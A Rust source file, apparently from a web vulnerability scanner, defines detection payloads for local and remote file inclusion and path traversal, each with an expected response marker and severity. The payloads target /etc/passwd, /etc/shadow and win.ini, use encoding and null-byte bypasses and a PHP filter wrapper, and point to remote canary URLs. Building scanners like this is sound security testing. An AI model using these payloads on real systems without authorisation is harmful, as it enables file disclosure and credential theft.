use crate::domain::active_vuln::{PayloadDefinition, ExpectedIndicator};
use crate::domain::entities::SeverityLevel;

pub fn get_lfi_payloads() -> Vec<PayloadDefinition> {
    vec![
        PayloadDefinition {
            id: "lfi_01".into(),
            payload: "../../../../etc/passwd".into(),
            description: "Linux passwd file traversal".into(),
            expected_indicator: ExpectedIndicator::FileContent("root:".into()),
            severity: SeverityLevel::High,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "lfi_02".into(),
            payload: "..\\..\\..\\..\\Windows\\win.ini".into(),
            description: "Windows win.ini traversal (backslash)".into(),
            expected_indicator: ExpectedIndicator::FileContent("[fonts]".into()),
            severity: SeverityLevel::High,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "lfi_03".into(),
            payload: "....//....//....//etc/passwd".into(),
            description: "Double-dot-slash filter bypass".into(),
            expected_indicator: ExpectedIndicator::FileContent("root:".into()),
            severity: SeverityLevel::High,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "lfi_04".into(),
            payload: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd".into(),
            description: "URL-encoded path traversal".into(),
            expected_indicator: ExpectedIndicator::FileContent("root:".into()),
            severity: SeverityLevel::High,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "lfi_05".into(),
            payload: "php://filter/convert.base64-encode/resource=index".into(),
            description: "PHP filter wrapper for source code disclosure".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("PD9waH".into()), // base64 of "<?ph"
            severity: SeverityLevel::High,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "lfi_06".into(),
            payload: "../../../../etc/shadow".into(),
            description: "Linux shadow file (requires root)".into(),
            expected_indicator: ExpectedIndicator::FileContent("root:$".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
    ]
}

pub fn get_rfi_payloads() -> Vec<PayloadDefinition> {
    vec![
        PayloadDefinition {
            id: "rfi_01".into(),
            payload: "http://limma-rfi-canary.test/shell.txt".into(),
            description: "Remote file inclusion canary".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("limma-rfi-canary".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: false,
        },
        PayloadDefinition {
            id: "rfi_02".into(),
            payload: "https://raw.githubusercontent.com/limma-test/canary/main/test.txt".into(),
            description: "GitHub-hosted canary file".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("limma-canary-ok".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: false,
        },
    ]
}

pub fn get_traversal_payloads() -> Vec<PayloadDefinition> {
    vec![
        PayloadDefinition {
            id: "traversal_01".into(),
            payload: "../".into(),
            description: "Simple one-level directory traversal".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff { baseline_hash: String::new(), indicator: "directory_listing".into() },
            severity: SeverityLevel::Medium,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "traversal_02".into(),
            payload: "..%00/".into(),
            description: "Null byte path traversal".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff { baseline_hash: String::new(), indicator: "null_byte_bypass".into() },
            severity: SeverityLevel::High,
            safe_for_production: true,
        },
    ]
}
